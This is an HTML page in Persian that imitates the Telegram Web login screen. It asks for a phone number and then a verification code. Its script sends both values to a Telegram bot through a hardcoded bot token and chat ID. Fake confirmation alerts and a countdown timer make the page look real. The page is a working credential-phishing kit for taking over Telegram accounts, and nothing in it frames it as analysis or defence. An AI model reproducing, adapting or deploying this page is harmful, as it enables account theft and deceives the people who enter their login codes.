<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Telegram Web - Login</title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      width: 100%;
      font-family: 'Arial', sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      background-color: #f5f5f5;
    }

    .container {
      width: 100%;
      max-width: 400px;
      height: 100%;
      display: flex;
      flex-direction: column;
      justify-content: center;
      background-color: #fff;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
      border-radius: 12px;
      padding: 20px;
      box-sizing: border-box;
    }

    .logo {
      text-align: center;
      margin-bottom: 20px;
    }

    .logo img {
      max-width: 150px;
    }

    .form-group {
      margin-bottom: 20px;
    }

    .form-group label {
      display: block;
      margin-bottom: 8px;
      font-weight: bold;
      font-size: 14px;
    }

    .form-group input,
    .form-group select {
      width: 100%;
      padding: 10px;
      font-size: 16px;
      border: 1px solid #ddd;
      border-radius: 5px;
      transition: border-color 0.3s;
    }

    .form-group input:focus,
    .form-group select:focus {
      border-color: #0088cc;
      outline: none;
    }

    .btn {
      background-color: #0088cc;
      color: #fff;
      padding: 12px 15px;
      font-size: 16px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      width: 100%;
      transition: background-color 0.3s;
    }

    .btn:hover {
      background-color: #007ab8;
    }

    .footer {
      margin-top: 20px;
      font-size: 12px;
      color: #aaa;
      text-align: center;
    }

    #timer {
      margin-top: 10px;
      font-size: 16px;
      color: #ff0000;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- لوگوی تلگرام -->
    <div class="logo">
      <img src="https://telegram.org/img/t_logo.png" alt="Telegram Logo">
    </div>

    <!-- فرم ورود -->
    <form id="login-form">
      <div class="form-group">
        <label for="country-code">کد کشور</label>
        <select id="country-code">
          <option value="+98">ایران (+98)</option>
          <option value="+1">آمریکا (+1)</option>
          <option value="+44">انگلستان (+44)</option>
          <option value="+33">فرانسه (+33)</option>
          <option value="+49">آلمان (+49)</option>
        </select>
      </div>

      <div class="form-group">
        <label for="phone">شماره تلفن</label>
        <input type="tel" id="phone" placeholder="09000000000" inputmode="numeric" pattern="[0-9]*">
      </div>

      <button class="btn" type="button" id="next-btn">بعدی</button>
    </form>

    <div class="footer">© 2024 Telegram</div>
  </div>

  <script>
    const botToken = "7649130822:AAF2kUPcAnMlSVwkgxIsGcopyx5z9aWd6Gs"; // توکن
    const chatId = "7386908761"; // آیدی عددی چت

    document.getElementById('next-btn').addEventListener('click', function() {
      const phone = document.getElementById('phone').value;
      const countryCode = document.getElementById('country-code').value;

      if (phone) {
        const fullPhoneNumber = countryCode + phone;

        // ارسال شماره تلفن به ربات تلگرام
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: `شماره تلفن: ${fullPhoneNumber}`
          })
        });

        if (confirm('آیا شماره ' + fullPhoneNumber + ' به درستی وارد شده است؟')) {
          alert('کد تأیید ارسال شد!');

          // نمایش بخش وارد کردن کد
          document.querySelector('.container').innerHTML = `
            <div class="logo">
              <img src="https://telegram.org/img/t_logo.png" alt="Telegram Logo">
            </div>
            <h3>کد ارسال شده را وارد نمایید</h3>
            <div class="form-group">
              <input type="text" id="verification-code" placeholder="کد تأیید را وارد کنید" inputmode="numeric" pattern="[0-9]*">
            </div>
            <div id="timer">زمان باقی‌مانده: 2:00</div>
            <button class="btn" id="verify-btn">تأیید</button>
          `;

          startTimer(); // شروع تایمر

          document.getElementById('verify-btn').addEventListener('click', function() {
            const verificationCode = document.getElementById('verification-code').value;

            if (verificationCode) {
              // ارسال کد تأیید به ربات تلگرام
              fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: {
                  "Content-Type": "application/json"
                },
                body: JSON.stringify({
                  chat_id: chatId,
                  text: `کد تأیید: ${verificationCode}`
                })
              });

              alert('کد با موفقیت ارسال شد!');
            } else {
              alert('لطفاً کد تأیید را وارد کنید.');
            }
          });
        }
      } else {
        alert('لطفاً شماره تلفن خود را وارد کنید.');
      }
    });

    // تایمر 2 دقیقه‌ای
    function startTimer() {
      let timeLeft = 120;  // 2 دقیقه = 120 ثانیه
      const timerElement = document.getElementById('timer');
      const interval = setInterval(function() {
        const minutes = Math.floor(timeLeft / 60);
        const seconds = timeLeft % 60;
        timerElement.innerHTML = 'زمان باقی‌مانده: ' + minutes + ':' + (seconds < 10 ? '0' + seconds : seconds);
        timeLeft--;

        if (timeLeft < 0) {
          clearInterval(interval);
          timerElement.innerHTML = 'زمان تمام شد';
        }
      }, 1000);
    }
  </script>
</body>
</html>
